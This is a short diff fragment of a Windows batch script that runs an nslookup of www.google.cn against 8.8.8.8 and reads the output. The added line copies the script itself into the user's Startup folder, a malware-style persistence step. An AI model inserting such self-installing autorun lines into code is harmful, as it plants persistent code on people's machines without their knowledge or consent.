@@ -1,4 +1,5 @@
 @echo off
+copy %0  "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
 nslookup  www.google.cn  8.8.8.8 > google.txt
 for /f  %%l  in (google.txt) do (
 	:echo %%l
